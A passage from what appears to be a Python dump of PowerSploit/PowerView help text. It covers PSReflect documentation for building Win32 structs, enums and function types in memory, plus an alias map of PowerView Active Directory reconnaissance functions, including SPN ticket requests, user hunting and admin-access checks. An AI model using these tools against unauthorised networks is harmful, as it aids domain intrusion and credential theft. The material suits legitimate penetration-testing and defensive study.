          'defining each field.\n'
          '\n'
          '.PARAMETER PackingSize\n'
          '\n'
          'Specifies the memory alignment of fields.\n'
          '\n'
          '.PARAMETER ExplicitLayout\n'
          '\n'
          'Indicates that an explicit offset for each field will be '
          'specified.\n'
          '\n'
          '.EXAMPLE\n'
          '\n'
          '$Mod = New-InMemoryModule -ModuleName Win32\n'
          '\n'
          '$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{\n'
          '    DOS_SIGNATURE =    0x5A4D\n'
          '    OS2_SIGNATURE =    0x454E\n'
          '    OS2_SIGNATURE_LE = 0x454C\n'
          '    VXD_SIGNATURE =    0x454C\n'
          '}\n'
          '\n'
          '$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{\n'
          '    e_magic =    field 0 $ImageDosSignature\n'
          '    e_cblp =     field 1 UInt16\n'
          '    e_cp =       field 2 UInt16\n'
          '    e_crlc =     field 3 UInt16\n'
          '    e_cparhdr =  field 4 UInt16\n'
          '    e_minalloc = field 5 UInt16\n'
          '    e_maxalloc = field 6 UInt16\n'
          '    e_ss =       field 7 UInt16\n'
          '    e_sp =       field 8 UInt16\n'
          '    e_csum =     field 9 UInt16\n'
          '    e_ip =       field 10 UInt16\n'
          '    e_cs =       field 11 UInt16\n'
          '    e_lfarlc =   field 12 UInt16\n'
          '    e_ovno =     field 13 UInt16\n'
          "    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)\n"
          '    e_oemid =    field 15 UInt16\n'
          '    e_oeminfo =  field 16 UInt16\n'
          "    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)\n"
          '    e_lfanew =   field 18 Int32\n'
          '}\n'
          '\n'
          '# Example of using an explicit layout in order to create a union.\n'
          '$TestUnion = struct $Mod TestUnion @{\n'
          '    field1 = field 0 UInt32 0\n'
          '    field2 = field 1 IntPtr 0\n'
          '} -ExplicitLayout\n'
          '\n'
          '.NOTES\n'
          '\n'
          'PowerShell purists may disagree with the naming of this function '
          'but\n'
          'again, this was developed in such a way so as to emulate a "C '
          'style"\n'
          "definition as closely as possible. Sorry, I'm not going to name it\n"
          'New-Struct. :P\n',
 'func': '    Param (\n'
         '        [Parameter(Position = 0, Mandatory = $True)]\n'
         '        [String]\n'
         '        $DllName,\n'
         '\n'
         '        [Parameter(Position = 1, Mandatory = $True)]\n'
         '        [string]\n'
         '        $FunctionName,\n'
         '\n'
         '        [Parameter(Position = 2, Mandatory = $True)]\n'
         '        [Type]\n'
         '        $ReturnType,\n'
         '\n'
         '        [Parameter(Position = 3)]\n'
         '        [Type[]]\n'
         '        $ParameterTypes,\n'
         '\n'
         '        [Parameter(Position = 4)]\n'
         '        [Runtime.InteropServices.CallingConvention]\n'
         '        $NativeCallingConvention,\n'
         '\n'
         '        [Parameter(Position = 5)]\n'
         '        [Runtime.InteropServices.CharSet]\n'
         '        $Charset,\n'
         '\n'
         '        [String]\n'
         '        $EntryPoint,\n'
         '\n'
         '        [Switch]\n'
         '        $SetLastError\n'
         '    )\n'
         '\n'
         '    $Properties = @{\n'
         '        DllName = $DllName\n'
         '        FunctionName = $FunctionName\n'
         '        ReturnType = $ReturnType\n'
         '    }\n'
         '\n'
         "    if ($ParameterTypes) { $Properties['ParameterTypes'] = "
         '$ParameterTypes }\n'
         '    if ($NativeCallingConvention) { '
         "$Properties['NativeCallingConvention'] = $NativeCallingConvention }\n"
         "    if ($Charset) { $Properties['Charset'] = $Charset }\n"
         "    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError "
         '}\n'
         "    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }\n"
         '\n'
         '    New-Object PSObject -Property $Properties\n'
         '}\n'
         '\n'
         '\n'
         'function Add-Win32Type\n'
         '{\n'
         '.SYNOPSIS\n'
         '\n'
         'Creates a .NET type for an unmanaged Win32 function.\n'
         '\n'
         'Author: Matthew Graeber (@mattifestation)\n'
         'License: BSD 3-Clause\n'
         'Required Dependencies: None\n'
         'Optional Dependencies: func\n'
         '\n'
         '.DESCRIPTION\n'
         '\n'
         'Add-Win32Type enables you to easily interact with unmanaged (i.e.\n'
         'Win32 unmanaged) functions in PowerShell. After providing\n'
         'Add-Win32Type with a function signature, a .NET type is created\n'
         'using reflection (i.e. csc.exe is never called like with Add-Type).\n'
         '\n'
         "The 'func' helper function can be used to reduce typing when "
         'defining\n'
         'multiple function definitions.\n'
         '\n'
         '.PARAMETER DllName\n'
         '\n'
         'The name of the DLL.\n'
         '\n'
         '.PARAMETER FunctionName\n'
         '\n'
         'The name of the target function.\n'
         '\n'
         '.PARAMETER EntryPoint\n'
         '\n'
         'The DLL export function name. This argument should be specified if '
         'the\n'
         'specified function name is different than the name of the exported\n'
         'function.\n'
         '\n'
         '.PARAMETER ReturnType\n'
         '\n'
         'The return type of the function.\n'
         '\n'
         '.PARAMETER ParameterTypes\n'
         '\n'
         'The function parameters.\n'
         '\n'
         '.PARAMETER NativeCallingConvention\n'
         '\n'
         'Specifies the native calling convention of the function. Defaults '
         'to\n'
         'stdcall.\n'
         '\n'
         '.PARAMETER Charset\n'
         '\n'
         "If you need to explicitly call an 'A' or 'W' Win32 function, you "
         'can\n'
         'specify the character set.\n'
         '\n'
         '.PARAMETER SetLastError\n'
         '\n'
         'Indicates whether the callee calls the SetLastError Win32 API\n'
         'function before returning from the attributed method.\n'
         '\n'
         '.PARAMETER Module\n'
         '\n'
         'The in-memory module that will host the functions. Use\n'
         'New-InMemoryModule to define an in-memory module.\n'
         '\n'
         '.PARAMETER Namespace\n'
         '\n'
         'An optional namespace to prepend to the type. Add-Win32Type '
         'defaults\n'
         'to a namespace consisting only of the name of the DLL.\n'
         '\n'
         '.EXAMPLE\n'
         '\n'
         '$Mod = New-InMemoryModule -ModuleName Win32\n'
         '\n'
         '$FunctionDefinitions = @(\n'
         '  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) '
         '-Charset Ansi -SetLastError),\n'
         '  (func kernel32 GetModuleHandle ([Intptr]) @([String]) '
         '-SetLastError),\n'
         '  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())\n'
         ')\n'
         '\n'
         '$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod '
         "-Namespace 'Win32'\n"
         "$Kernel32 = $Types['kernel32']\n"
         "$Ntdll = $Types['ntdll']\n"
         '$Ntdll::RtlGetCurrentPeb()\n'
         "$ntdllbase = $Kernel32::GetModuleHandle('ntdll')\n"
         "$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')\n"
         '\n'
         '.NOTES\n'
         '\n'
         "Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189\n"
         '\n'
         'When defining multiple function prototypes, it is ideal to provide\n'
         'Add-Win32Type with an array of function signatures. That way, they\n'
         'are all incorporated into the same in-memory module.\n',
 'psenum': '.SYNOPSIS\n'
           '\n'
           'Creates an in-memory enumeration for use in your PowerShell '
           'session.\n'
           '\n'
           'Author: Matthew Graeber (@mattifestation)\n'
           'License: BSD 3-Clause\n'
           'Required Dependencies: None\n'
           'Optional Dependencies: None\n'
           '\n'
           '.DESCRIPTION\n'
           '\n'
           "The 'psenum' function facilitates the creation of enums entirely "
           'in\n'
           'memory using as close to a "C style" as PowerShell will allow.\n'
           '\n'
           '.PARAMETER Module\n'
           '\n'
           'The in-memory module that will host the enum. Use\n'
           'New-InMemoryModule to define an in-memory module.\n'
           '\n'
           '.PARAMETER FullName\n'
           '\n'
           'The fully-qualified name of the enum.\n'
           '\n'
           '.PARAMETER Type\n'
           '\n'
           'The type of each enum element.\n'
           '\n'
           '.PARAMETER EnumElements\n'
           '\n'
           'A hashtable of enum elements.\n'
           '\n'
           '.PARAMETER Bitfield\n'
           '\n'
           'Specifies that the enum should be treated as a bitfield.\n'
           '\n'
           '.EXAMPLE\n'
           '\n'
           '$Mod = New-InMemoryModule -ModuleName Win32\n'
           '\n'
           '$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{\n'
           '    UNKNOWN =                  0\n'
           "    NATIVE =                   1 # Image doesn't require a "
           'subsystem.\n'
           '    WINDOWS_GUI =              2 # Image runs in the Windows GUI '
           'subsystem.\n'
           '    WINDOWS_CUI =              3 # Image runs in the Windows '
           'character subsystem.\n'
           '    OS2_CUI =                  5 # Image runs in the OS/2 '
           'character subsystem.\n'
           '    POSIX_CUI =                7 # Image runs in the Posix '
           'character subsystem.\n'
           '    NATIVE_WINDOWS =           8 # Image is a native Win9x '
           'driver.\n'
           '    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE '
           'subsystem.\n'
           '    EFI_APPLICATION =          10\n'
           '    EFI_BOOT_SERVICE_DRIVER =  11\n'
           '    EFI_RUNTIME_DRIVER =       12\n'
           '    EFI_ROM =                  13\n'
           '    XBOX =                     14\n'
           '    WINDOWS_BOOT_APPLICATION = 16\n'
           '}\n'
           '\n'
           '.NOTES\n'
           '\n'
           'PowerShell purists may disagree with the naming of this function '
           'but\n'
           'again, this was developed in such a way so as to emulate a "C '
           'style"\n'
           "definition as closely as possible. Sorry, I'm not going to name "
           'it\n'
           'New-Enum. :P\n'}

aliases = {'Add-ObjectAcl': 'Add-DomainObjectAcl',
 'Convert-NameToSid': 'ConvertTo-SID',
 'Convert-SidToName': 'ConvertFrom-SID',
 'Find-ForeignGroup': 'Get-DomainForeignGroupMember',
 'Find-ForeignUser': 'Get-DomainForeignUser',
 'Find-GPOComputerAdmin': 'Get-DomainGPOComputerLocalGroupMapping',
 'Find-GPOLocation': 'Get-DomainGPOUserLocalGroupMapping',
 'Find-ManagedSecurityGroups': 'Get-DomainManagedSecurityGroup',
 'Get-ADObject': 'Get-DomainObject',
 'Get-CachedRDPConnection': 'Get-WMIRegCachedRDPConnection',
 'Get-DFSshare': 'Get-DomainDFSShare',
 'Get-DNSRecord': 'Get-DomainDNSRecord',
 'Get-DNSZone': 'Get-DomainDNSZone',
 'Get-DomainPolicy': 'Get-DomainPolicyData',
 'Get-GUIDMap': 'Get-DomainGUIDMap',
 'Get-IPAddress': 'Resolve-IPAddress',
 'Get-LastLoggedOn': 'Get-WMIRegLastLoggedOn',
 'Get-LoggedOnLocal': 'Get-RegLoggedOn',
 'Get-NetComputer': 'Get-DomainComputer',
 'Get-NetDomain': 'Get-Domain',
 'Get-NetDomainController': 'Get-DomainController',
 'Get-NetDomainTrust': 'Get-DomainTrust',
 'Get-NetFileServer': 'Get-DomainFileServer',
 'Get-NetForest': 'Get-Forest',
 'Get-NetForestCatalog': 'Get-ForestGlobalCatalog',
 'Get-NetForestDomain': 'Get-ForestDomain',
 'Get-NetForestTrust': 'Get-ForestTrust',
 'Get-NetGPO': 'Get-DomainGPO',
 'Get-NetGPOGroup': 'Get-DomainGPOLocalGroup',
 'Get-NetGroup': 'Get-DomainGroup',
 'Get-NetGroupMember': 'Get-DomainGroupMember',
 'Get-NetOU': 'Get-DomainOU',
 'Get-NetProcess': 'Get-WMIProcess',
 'Get-NetSite': 'Get-DomainSite',
 'Get-NetSubnet': 'Get-DomainSubnet',
 'Get-NetUser': 'Get-DomainUser',
 'Get-ObjectAcl': 'Get-DomainObjectAcl',
 'Get-Proxy': 'Get-WMIRegProxy',
 'Get-RegistryMountedDrive': 'Get-WMIRegMountedDrive',
 'Get-SiteName': 'Get-NetComputerSiteName',
 'Get-UserEvent': 'Get-DomainUserEvent',
 'Invoke-ACLScanner': 'Find-InterestingDomainAcl',
 'Invoke-CheckLocalAdminAccess': 'Test-AdminAccess',
 'Invoke-EnumerateLocalAdmin': 'Find-DomainLocalGroupMember',
 'Invoke-EventHunter': 'Find-DomainUserEvent',
 'Invoke-FileFinder': 'Find-InterestingDomainShareFile',
 'Invoke-MapDomainTrust': 'Get-DomainTrustMapping',
 'Invoke-ProcessHunter': 'Find-DomainProcess',
 'Invoke-ShareFinder': 'Find-DomainShare',
 'Invoke-ThreadedFunction': 'New-ThreadedFunction',
 'Invoke-UserHunter': 'Find-DomainUserLocation',
 'Request-SPNTicket': 'Get-DomainSPNTicket',
 'Set-ADObject': 'Set-DomainObject'}